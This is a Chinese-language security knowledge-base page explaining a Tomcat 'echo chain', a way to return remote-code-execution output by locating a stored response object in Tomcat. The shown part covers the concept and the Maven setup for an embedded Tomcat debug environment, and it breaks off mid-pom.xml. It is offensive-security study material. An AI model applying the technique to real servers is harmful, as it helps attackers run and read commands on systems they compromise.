<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/RCE回显链/Tomcat回显链（一）" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">Tomcat回显链（一） | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Tomcat回显链（一） | d4m1ts 知识库"><meta data-rh="true" name="description" content="介绍"><meta data-rh="true" property="og:description" content="介绍"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"RCE回显链","item":"https://blog.gm7.org/docs/category/rce回显链"},{"@type":"ListItem","position":3,"name":"Tomcat回显链（一）","item":"https://blog.gm7.org/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.f7944275.css">
<script src="/assets/js/runtime~main.7a2f1031.js" defer="defer"></script>
<script src="/assets/js/main.d14e79f0.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="折叠侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/RCE回显链/Tomcat回显链（一）">Tomcat回显链（一）</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/rce回显链"><span>RCE回显链</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Tomcat回显链（一）</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Tomcat回显链（一）</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="介绍">介绍<a href="#介绍" class="hash-link" aria-label="介绍的直接链接" title="介绍的直接链接">​</a></h2>
<p>2020年3月长亭Litch1师傅找到的一种基于全局储存的新思路，寻找在Tomcat处理Filter和Servlet之前有没有存储response变量的对象。整个过程分析下来就像是在构造调用链，一环扣一环，直到找到了那个静态变量或者是那个已经创建过的对象。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="优势">优势<a href="#优势" class="hash-link" aria-label="优势的直接链接" title="优势的直接链接">​</a></h3>
<p>利用中间件来实现回显，可以跨平台通用，只要使用了相关的组件就可以达到回显的目的</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="实现手法">实现手法<a href="#实现手法" class="hash-link" aria-label="实现手法的直接链接" title="实现手法的直接链接">​</a></h3>
<p>个人感觉和内存马输出的方法类似，要想控制输出，那么就要获取到<code>response</code>，然后对其进行定制化调用，实现内容输出</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="快速搭建tomcat调试环境">快速搭建tomcat调试环境<a href="#快速搭建tomcat调试环境" class="hash-link" aria-label="快速搭建tomcat调试环境的直接链接" title="快速搭建tomcat调试环境的直接链接">​</a></h2>
<p>之前在学习EL表达式的时候，使用了IDEA一种<a href="/docs/代码审计/Java安全/审计基础/EL表达式#%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAtomcat%E7%8E%AF%E5%A2%83">结合本地tomcat服务器搭建环境</a>的方法；</p>
<p>这次我们使用另一种内置Tomcat的方法，来方便我们调试tomcat</p>
<hr>
<p>Tomcat实际上也是一个Java程序，我们看看Tomcat的启动流程：</p>
<ol>
<li>启动JVM并执行Tomcat的<code>main()</code>方法；</li>
<li>加载war并初始化Servlet；</li>
<li>正常服务。</li>
</ol>
<p>启动Tomcat无非就是设置好classpath并执行Tomcat某个jar包的<code>main()</code>方法，我们完全可以把Tomcat的jar包全部引入进来，然后自己编写一个<code>main()</code>方法，先启动Tomcat，然后让它加载我们的webapp就行。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="创建maven项目">创建maven项目<a href="#创建maven项目" class="hash-link" aria-label="创建maven项目的直接链接" title="创建maven项目的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="创建webapp模板" src="/assets/images/image-20220209120802123-7749c3c5020cc7217c3cf1669aaca0fb.png" width="1604" height="1360" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修改pomxml">修改pom.xml<a href="#修改pomxml" class="hash-link" aria-label="修改pom.xml的直接链接" title="修改pom.xml的直接链接">​</a></h3>
<p>引入tomcat依赖包，修改<code>pom.xml</code>文件，引入依赖 <code>tomcat-embed-core</code> 和 <code>tomcat-embed-jasper</code>，引入的 Tomcat 版本 <code>&lt;tomcat.version&gt;</code> 为 <strong>8.5.47</strong>。</p>
<blockquote>
<p><strong>tomcat-embed-core</strong> 依赖包含 javax.servlet 下的内容，因此不需要再额外引入依赖 <strong>javax.servlet-api</strong>。</p>
</blockquote>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">properties</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">project.build.sourceEncoding</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">UTF-8</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">project.build.sourceEncoding</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">maven.compiler.source</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">1.7</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">maven.compiler.source</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">maven.compiler.target</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">1.7</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">maven.compiler.target</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">tomcat.version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">8.5.47</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">tomcat.version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- 设定tomcat版本 --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">properties</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.tomcat.embed</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">tomcat-embed-core</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">${tomcat.version}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">scope</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">provided</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">scope</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.tomcat.embed</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">tomcat-embed-jasper</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">${tomcat.version}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">scope</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">provided</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">scope</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.tomcat</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">tomcat-jasper</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- idea 识别不出来，要单独引入这个依赖 --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">${tomcat.version}</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" 